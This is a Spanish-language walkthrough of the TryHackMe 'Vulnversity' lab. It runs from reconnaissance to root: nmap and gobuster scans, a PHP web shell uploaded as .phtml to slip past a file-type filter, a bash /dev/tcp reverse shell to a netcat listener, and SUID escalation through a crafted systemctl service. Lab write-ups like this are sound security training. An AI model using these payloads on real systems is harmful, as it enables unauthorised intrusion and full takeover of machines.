https://tryhackme.com/r/room/vulnversity
# Fase de reconocimiento
## Buscamos puertos abiertos
```
nmap -sT -Pn --top-ports 500 -open -T5 -v -n 10.10.186.218 -oG allPorts
```
![[Pasted image 20240426174427.png]]
## Reconocimiento de servicios
```
nmap -sCV -p21,22,139,445,3128,3333 10.10.186.218 -oN targeted
```
![[Pasted image 20240426174610.png]]
## crackmapexec
```
crackmapexec smb 10.10.186.218
```
![[Pasted image 20240426173603.png]]
[-] Parcheado

## Gobuster
```
gobuster dir -u http://10.10.186.218:3333 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```
![[Pasted image 20240426175926.png]]
# Fase de ataque
Podemos hacer un LFI to RCE en /internal
1. Creamos un payload
```
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```
![[Pasted image 20240426180945.png]]
2. Observamos que la extensión .php no está permitida por lo que la cambiamos hasta encontrar otra que funciona .phtml
3. Insertamos el payload
![[Pasted image 20240426181202.png]]
## Para ganar acceso al sistema (Reverse Shell)

1. Nos ponemos en escucha por el puerto 443
```
nc -nlvp 443
```
2. Mandamos la Reverse Shell
```
?cmd=bash -c "bash -i>%26 /dev/tcp/<ipA>/443 0>%261"
```

[-] ==pwned!==
## Ajustar terminal
```
script /dev/null -c bash
```
ctrl + z
```
stty raw -echo; fg
```
```
	reset xterm
```
```
export TERM=xterm
```
Ajustar proporciones
```
stty rows 44 columns 184
```

# Privilege Escalation
## Privilege Escalation via SUID
1. Primero buscamos archivos donde tenga permisos
```
find / -perm-u=s -type f 2>/dev/null
```
2. Vemos que /bin/systemctl tiene permisos
3. cd /bin
4. Buscamos la vulnerabilidad aquí: [gtfobins.](https://gtfobins.github.io/gtfobins/systemctl/)
5. Ejecutamos este comando. En ExecStart entre "" ponemos el comando a ejeuctar
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
6. 
```
bash -p
```
[+] ==pwned!==
